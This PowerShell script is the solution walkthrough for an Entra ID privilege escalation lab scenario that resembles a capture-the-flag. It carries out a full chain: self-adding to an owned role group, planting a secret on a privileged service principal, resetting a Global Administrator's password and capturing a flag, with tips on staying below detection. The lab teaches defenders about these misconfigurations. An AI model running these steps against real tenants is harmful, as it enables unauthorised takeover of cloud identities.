<#
.SYNOPSIS
EntraGoat Scenario 3: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 3 - Group Ownership Privilege Escalation Chain
Group-Ownership -> App Admin -> SP -> PAA -> GA

Attack flow: 

1. The attacker starts as a low-privileged IT support user (Michael Chen).
Through a misconfiguration, this user owns multiple security groups - some with administrative roles assigned and others as normal groups without roles.

2. Since group owners can manage group membership, the attacker can add themselves to any of these groups.
No approval needed - group ownership means full control over membership. This gives them access to multiple privileged roles from the groups that have roles assigned.

3. With Application Administrator role (from IT Application Managers group), the attacker can manage ALL application registrations and service principals in the tenant.
This includes adding credentials to any service principal - a powerful capability often overlooked.

4. The attacker discovers a service principal that's a member of another group with Privileged Authentication Administrator (PAA) role.
This creates a privilege escalation chain: Group Owner -> App Admin -> SP -> PAA.

5. The attacker adds credentials to this SP and authenticates as it.

6. Using these privileges, the attacker resets the Global Administrator's password.
PAA can reset passwords for any user, including Global Admins.

7. The attacker logs in as the Global Administrator and retrieves the flag.
Complete tenant compromise achieved through a chain of legitimate but misconfigured permissions.

- - - 

--> So... why this works?
This attack exploits several common misconfigurations and oversight issues:

1. Group Ownership is Powerful: Many organizations don't realize that group owners have full control over membership.
   When these groups have privileged roles, ownership becomes a backdoor to those privileges.

2. Role-Assignable Groups: The ability to assign roles to groups is convenient but dangerous.
   It creates indirect paths to privileges that are harder to audit and track.

3. Application Administrator Scope: This role can manage ALL applications, not just owned ones.
   It's often given out thinking it's limited, but it's actually extremely powerful.

4. Service Principal Group Membership: SPs can be members of groups with roles, creating non-obvious privilege paths.
   Many admins focus on user memberships and forget about service principals - the function Get-MgGroupMember doesn't even show SPs on v1.0

Common scenarios where this happens:
- IT support teams given group ownership for "self-service" management
- Old service principals added to admin groups and forgotten
- Role-assignable groups created without proper governance
- Application Administrator role given to development teams

The attack is particularly dangerous because:
- Each individual part seems reasonable in isolation
- The privilege chain can be challenging to spot in large environments
- All actions use legitimate APIs and permissions
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools such GraphRunner, ROADtools, and AADInternals or simply Connect-MgGraph can be used as well.
#>

# quick wrapper to list all members of a group (handles SPs too - uses /beta)
# as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
function Get-GroupMembers {
    param([string]$GroupId)
    return (Invoke-MgGraphRequest -Uri "/beta/groups/$GroupId/members" -Method GET).value
}

# return all groups a given identity owns and their roles
function Get-GroupsOwnedBy {
    param([string]$UserId)
    
    Write-Host "Enumerating all groups in the tenant..."
    $allGroups = Get-MgGroup -All -Property Id, DisplayName, Description, MailEnabled, SecurityEnabled, GroupTypes, IsAssignableToRole
    Write-Host "Found $($allGroups.Count) groups in tenant"
    
    $ownedGroups = @()
    $checkCount = 0
    
    foreach ($group in $allGroups) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allGroups.Count) groups..."
        }
        try {
            $owners = Get-MgGroupOwner -GroupId $group.Id -ErrorAction Stop
            foreach ($owner in $owners) {
                if ($owner.Id -eq $UserId) {
                    # Get assigned roles if applicable
                    $assignedRoles = @()
                    if ($group.IsAssignableToRole) {
                        $assignedRoles = Get-GroupRoles -GroupId $group.Id
                    }

                    # Write-Host "OWNED GROUP FOUND!" -ForegroundColor Red
                    Write-Host "   Name: $($group.DisplayName)" -ForegroundColor Yellow
                    Write-Host "   Group ID: $($group.Id)" -ForegroundColor Yellow
                    
                    if ($assignedRoles) {
                        Write-Host "   Assigned Roles: $($assignedRoles -join ', ')" -ForegroundColor Red
                    } else {
                        if ($group.IsAssignableToRole) {
                            Write-Host "   Assigned Roles: None (group can be assigned roles)" -ForegroundColor Gray
                        } else {
                            Write-Host "   Assigned Roles: N/A" -ForegroundColor Gray
                        }
                    }

                    $ownedGroups += [PSCustomObject]@{
                        GroupID = $group.Id
                        DisplayName = $group.DisplayName
                        AssignedRoles = $assignedRoles
                    }
                    break  
                }
            }
        }
        catch {
            Write-Host "Error checking owners for group $($group.DisplayName): $_" -ForegroundColor DarkYellow
        }
    }
    $ownedTotal = $ownedGroups.Count
    $ownedWithRoles = ($ownedGroups | Where-Object { $_.AssignedRoles -and $_.AssignedRoles.Count -gt 0 }).Count
    Write-Host "Owned groups found: $ownedTotal" -ForegroundColor Cyan
    Write-Host "Owned groups with roles: $ownedWithRoles" -ForegroundColor Cyan
    return $ownedGroups
}

# helper function to get roles assigned to a group
function Get-GroupRoles {
    param([string]$GroupId)
    
    $roles = @()
    try {
        $assignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$GroupId'"
        foreach ($a in $assignments) {
            $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $a.RoleDefinitionId
            $roles += $roleDef.DisplayName
        }
    }
    catch {
        Write-Host "Error retrieving roles for group $GroupId : $_" -ForegroundColor DarkYellow
    }
    return $roles
}


$tenantId = "[YOUR-TENANT-ID]"
$UPN = "michael.chen@[YOUR-DOMAIN].onmicrosoft.com"
$password = "GoatAccess!123"

# Step 1: Authentication
Connect-MgGraph

# Alternatively, we can use BARK to acquire a delegated graph token via ROPC:
# Connect-MgGraph -AccessToken (ConvertTo-SecureString ((Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token) -AsPlainText -Force)

Get-MgContext

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# Step 2: Enumeration 
# discover all groups owned by the current user
$ownedGroups = Get-MgGroup -All | Where-Object {
    (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
}
$ownedGroups 

# lets check each group for its role/s
$roleGroups = $ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }

foreach ($group in $roleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" | 
             ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
    if ($roles) {
        Write-Host "Group '$($group.DisplayName)' has roles: $($roles -join ', ')" 
    }
}
# IT Application Managers group has the Application Administrator role!! 


# Alternatively we can use the flashy Get-GroupsOwnedBy function to automate the whole process 
# of finding role assignable groups owned by the current user
$ownedGroups = Get-GroupsOwnedBy -UserId $currentUser.Id 

# OR we can use the very simple and powerful Get-MgUserOwnedObject:
Get-MgUserOwnedObject -UserId $currentUser.Id -All

# Get-MgUserOwnedObject efficiently enumerates all directory objects owned by a user, eliminating the need to 
# query groups, apps & SPs, and devices object types individually like we intentionally just did.
# a bit more nicely (thanks Sonnet!)
Get-MgUserOwnedObject -UserId $currentUser.Id -All | Select-Object Id,@{n='DisplayName';e={$_.AdditionalProperties.displayName ?? $_.DisplayName}},@{n='Type';e={(($_.OdataType ?? $_.AdditionalProperties.'@odata.type' ?? $_.GetType().Name) -replace '^#?microsoft\.graph\.','')}}


# Get-GroupsOwnedBy function would made 100-1000x more API requests compared to Get-MgUserOwnedObject 
# When selecting enumeration tools, always prioritize efficiency - minimum queries equals minimum logs and detection surface. 
# There are many awesome (and some less-awesome) open source tools for enumerating Entra ID - its better to read the source code whenever possible to understand what's happening under the hood



# Step 4: Building the attack chain

<#
    Since we now have the ability to add ourselves to an Application Administrator group and inrent its the role,
    we can add creds to any service principal in the tenant. Time to hunt for high-value SPs.

    For this walkthrough, we'll focus on SPs with roles that can reset a GA's password:
        Privileged Role Administrator (PRA), 
        Privileged Authentication Administrator (PAA) and 
        Global Administrator (GA)
    But, when searching the tenant for privileged SPs, attackers should enumerate for SPs with interesting app permissions as well as those can be very powerful as seen in Scenario 2. 
#>

# lets list all SPs in the tenant that have PRA, PAA or GA roles assigned
$roleMap = @{
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
    "e8611ab8-c189-46e8-94e1-60213ab1f814" = "Privileged Role Administrator"
}

Get-MgRoleManagementDirectoryRoleAssignment -All |
  Where-Object { $roleMap.Keys -contains $_.RoleDefinitionId } |
  ForEach-Object  { Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId -ErrorAction SilentlyContinue } |
  Sort-Object Id -Unique |
  Select-Object DisplayName, AppId, Id

# (None should be returned)

# BUT that's not the complete set of SPs with these privileges. 
# We need to enumerate each group holding these roles and identify which of their members are service principals.
# first we'll find all groups that have the roles assigned:
$allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"
$privilegedGroups = @()
foreach ($group in $allRoleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
             Select-Object -Expand RoleDefinitionId

    if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "$($group.DisplayName) has role: GA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
        Write-Host "$($group.DisplayName) has role: PAA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "e8611ab8-c189-46e8-94e1-60213ab1f814") {
        Write-Host "$($group.DisplayName) has role: PRA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
}

# Find SP members in those groups
$targetSPs = @() 
foreach ($group in $privilegedGroups) {
    $members = Get-GroupMembers -GroupId $group.Id
    $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
    foreach ($sp in $spMembers) {
        $targetSPs += [PSCustomObject]@{
            Name = $sp.displayName
            SPId = $sp.id
            AppId = $sp.appId
            GroupName = $group.DisplayName
        }
    }
}
$targetSPs

# Found - Identity Management Portal!

<#
Note:
    Depending on the tenant, there may be multiple service principals holding the PRA, PAA or GA roles. 
    While we could just grab the first result ($targetSPs[0]), for consistency across environments (and to avoid breaking anything)
    we'll target the Infrastructure Monitoring Tool service principal. This SP is guaranteed to exist in every tenant, ensuring all players follow the same path.
#>


# Step 5: Executing the attack path 

# we own IT Application Managers group that has the Application Administrator role
$ITgroup = Get-MgGroup -Filter "displayName eq 'IT Application Managers'" 

# since we own the group, we can add ourselves to it
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $ITgroup.Id -BodyParameter $memberParams

# refresh the context to see the new group membership 
Disconnect-MgGraph

$userAccessToken2 = (Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token
Connect-MgGraph -AccessToken (ConvertTo-SecureString $userAccessToken2 -AsPlainText -Force)

# you can use the parse-JWTToken cmdlet by BARK to see the new roles (wids) assigned to the user
parse-JWTToken $userToken.access_token
# VS
parse-JWTToken $userAccessToken2

$targetSP = $targetSPs | Where-Object { $_.Name -eq "Identity Management Portal" }

$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSP.SPId -PasswordCredential $passwordCredential

$clientSecret = $newSecret.SecretText # save it
$clientSecret

# Disconnect current session 
Disconnect-MgGraph

# pivot to the SP
$secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($targetSP.AppId, $secureSecret)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

Get-MgContext

# Find the target GA user and reset their password
$targetAdminUPN = "EntraGoat-admin-s3@" + ((Get-MgOrganization).VerifiedDomains | Where-Object IsDefault).Name
$adminUser = Get-MgUser -Filter "userPrincipalName eq '$targetAdminUPN'"
$adminUser

$newPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$newPassword
$passwordProfile = @{
    Password = $newPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $adminUser.Id -PasswordProfile $passwordProfile

Disconnect-MgGraph

# Step 7: Authenticate as GA and get flag

$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
$SecureAdminToken = ConvertTo-SecureString $($adminToken.access_token) -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# Retrieve flag to prove successful compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

Disconnect-MgGraph

# Don't forget to run the cleanup script to restore the tenant to it's original state!
# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.

# Official blog post: https://www.semperis.com/blog/
